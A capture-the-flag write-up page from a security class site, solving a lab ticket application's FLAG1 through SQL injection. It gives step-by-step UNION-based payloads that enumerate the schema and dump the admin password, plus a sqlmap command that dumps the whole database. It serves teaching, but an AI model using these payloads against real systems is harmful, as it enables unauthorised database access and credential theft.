@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	
+	<title> | ClassRoom</title>
+	
+	<meta name="description" content="" />
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
+	 crossorigin="anonymous">
+	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
+	<link href="/class/css/medium.css" rel="stylesheet">
+	<link href="/class/css/additional.css" rel="stylesheet">
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
+    <div class="container pr-0">
+        
+        <a class="navbar-brand" href="https://anir0y.github.io/class//">
+
+            
+            <span style="font-family:Righteous;">ClassRoom</span>
+            
+        </a>
+        
+
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarMediumish" aria-controls="navbarSupportedContent"
+            aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        
+        <div class="collapse navbar-collapse" id="navbarMediumish">
+            
+            <ul class="navbar-nav ml-auto">
+                
+                <li class="nav-item ">
+                    <a class="nav-link" href="https://hackerinside.xyz">Lab</a>
+                </li>
+                
+                <li class="nav-item ">
+                    <a class="nav-link" href="/class/quickbits/">Quick Bits</a>
+                </li>
+                
+                <li class="nav-item ">
+                    <a class="nav-link" href="/class/kle">KLE </a>
+                </li>
+                
+                <li class="nav-item ">
+                    <a class="nav-link" href="/class/static/enroll">Enroll</a>
+                </li>
+                
+            </ul>
+        </div>
+        
+    </div>
+</nav>
+
+
+        <div class="site-content">   
+            <div class="container">
+<div class="mainheading">
+    <h1 class="sitetitle">ClassRoom</h1>
+    <p class="lead">
+         
+    </p>
+</div><div class="main-content">
+        
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-md-2 pl-0"><div class="share sticky-top sticky-top-offset">
+    <p>Share</p>
+    <ul>
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://twitter.com/intent/tweet?text=&url=https%3a%2f%2fanir0y.github.io%2fclass%2fctf-101%2fticketastic_live_instance%2fflag1%2freadme%2f" onclick="window.open(this.href, 'twitter-share', 'width=550,height=435');return false;">
+        <i class="fab fa-twitter"></i>
+        </a>
+        </li>
+        
+        <li class="ml-1 mr-1">
+        <a target="_blank" href="https://facebook.com/sharer.php?u=https%3a%2f%2fanir0y.github.io%2fclass%2fctf-101%2fticketastic_live_instance%2fflag1%2freadme%2f" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
+        <i class="fab fa-facebook-f"></i>
+        </a>
+        </li>      
+    </ul>
+
+    
+</div>
+</div>
+                                
+                <div class="col-md-9 flex-first flex-md-unordered">
+                    <div class="mainheading">
+                        	
+                        
+                        
+                                                
+                        
+                        <h1 class="posttitle"></h1> 
+                    </div>
+
+                    
+                    
+                    
+                    
+                    
+                    <div class="article-post">
+                        
+
+<h1 id="ticketastic-live-instance-flag1">Ticketastic: Live Instance - FLAG1</h1>
+
+<h2 id="0x00-ticket-page">0x00 Ticket Page</h2>
+
+<p><a href="http://127.0.0.1/xxxxxxxxxx/ticket?id=1">http://127.0.0.1/xxxxxxxxxx/ticket?id=1</a></p>
+
+<p><img src="../flag0/imgs/flag.jpg" alt="" /></p>
+
+<h2 id="0x01-try-modify-parameters">0x01 Try Modify Parameters</h2>
+
+<pre><code class="language-sql">ticket?id=1'
+</code></pre>
+
+<p>Get some error message</p>
+
+<pre><code>Traceback (most recent call last):
+  File &quot;./main.py&quot;, line 78, in ticket
+    cur.execute('SELECT title, body, reply FROM tickets WHERE id=%s' % request.args['id'])
+  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py&quot;, line 255, in execute
+    self.errorhandler(self, exc, value)
+  File &quot;/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py&quot;, line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1&quot;)
+</code></pre>
+
+<p>So it uses MySQL database and seems can be injected here.</p>
+
+<p>Double check by try. The first link works but the second one shows error.</p>
+
+<pre><code class="language-sql">ticket?id=1 AND 1=1
+ticket?id=1 AND 1=2
+</code></pre>
+
+<h2 id="0x02-get-table-fields-number">0x02 Get Table Fields Number</h2>
+
+<pre><code class="language-sql">ticket?id=1 AND 1=1 ORDER BY 10
+ticket?id=1 AND 1=1 ORDER BY 3
+</code></pre>
+
+<p>Reduce <strong>RDER BY</strong> number until it shows web page properly again.</p>
+
+<p>While <strong>ORDER BY 4</strong> still shows ERROR but <strong>ORDER BY 3</strong> can perform correct. This means the Table selection has 3 fields.</p>
+
+<h2 id="0x03-check-output-locations">0x03 Check Output Locations</h2>
+
+<pre><code class="language-sql">ticket?id=1.1 UNION SELECT 1,2,3--
+</code></pre>
+
+<p><img src="./imgs/output.jpg" alt="" /></p>
+
+<h2 id="0x04-get-current-database-version-table-schema">0x04 Get Current Database Version, TABLE_SCHEMA</h2>
+
+<pre><code class="language-sql">ticket?id=1.1 UNION SELECT VERSION(),DATABASE(),3--
+</code></pre>
+
+<p><img src="./imgs/db.jpg" alt="" /></p>
+
+<h2 id="0x05-get-table-name">0x05 Get TABLE_NAME</h2>
+
+<pre><code class="language-sql">ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--
+</code></pre>
+
+<p><img src="./imgs/tables.jpg" alt="" /></p>
+
+<p>So the useful TABLE_NAME = users</p>
+
+<h2 id="0x06-get-column-name">0x06 Get COLUMN_NAME</h2>
+
+<pre><code class="language-sql">ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
+</code></pre>
+
+<p><img src="./imgs/columns.jpg" alt="" /></p>
+
+<h2 id="0x07-dump-data-flag">0x07 Dump Data (FLAG)</h2>
+
+<pre><code class="language-sql">ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--
+</code></pre>
+
+<p><img src="./imgs/flag.jpg" alt="" /></p>
+
+<h2 id="0x08-why-do-not-use-sqlmap">0x08 Why Do Not Use SQLMAP?</h2>
+
+<p>Ok, let&rsquo;s do it with <a href="https://github.com/sqlmapproject/sqlmap">SQLMAP</a> again.</p>
+
+<h3 id="catch-the-request-and-save-to-a-file">Catch the Request and Save to a File</h3>
+
+<p>Save the following request to the file <a href="./request.txt">request.txt</a></p>
+
+<pre><code>GET /xxxxxxxxxx/ticket?id=1 HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session_level7b={ADMIN SESSION}
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+</code></pre>
+
+<p>And run the following command</p>
+
+<pre><code>python sqlmap.py -r request.txt --dump
+</code></pre>
+
+<p><img src="./imgs/flag1.jpg" alt="" /></p>
+
+                    </div>
+                    
+                    
+                    <div class="after-post-tags">
+                        <ul class="tags">
+                        
+                        </ul>
+                    </div>
+                    
+                    
+                    
+                    <div class="row PageNavigation d-flex justify-content-between font-weight-bold">
+                    
+                        <a class="d-block col-md-6" href="/class/ctf-101/ticketastic_live_instance/flag0/readme/"> &laquo; </a>
+                    
+                    
+                    <div class="clearfix"></div>
+                    </div>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+    </div>
+
+
+            </div>
+<div class="jumbotron fortags">
+	<div class="d-md-flex h-100">
+		<div class="col-md-4 transpdark align-self-center text-center h-100">
+			<div class="d-md-flex align-items-center justify-content-center h-100">
+				<h2 class="d-md-block d-none align-self-center py-1 font-weight-light">Explore <span class="d-none d-md-inline">→</span></h2>
+			</div>
+		</div>
+		<div class="col-md-8 p-5 align-self-center text-center">
+			
+			<a class="mt-1 mb-1" href="/class/tags/aws">aws</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/bash">bash</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/books">books</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/bot">bot</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/cheatsheet">cheatsheet</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/class">class</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/linux">linux</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/msf">msf</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/nmap">nmap</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/osint">osint</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/pentesting">pentesting</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/policy">policy</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/powershell">powershell</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/telegram">telegram</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/threat-model">threat-model</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/tmux">tmux</a>
+			
+			<a class="mt-1 mb-1" href="/class/tags/windows">windows</a>
+			
+		</div>
+	</div>
+</div>
+
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            
+            <div class="col-md-6 col-sm-6 text-center text-lg-left">
+                &copy; Copyright anir0y
+            </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
+
+<script src="/class/js/mediumish.js"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-142104594-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    </body>
+</html>
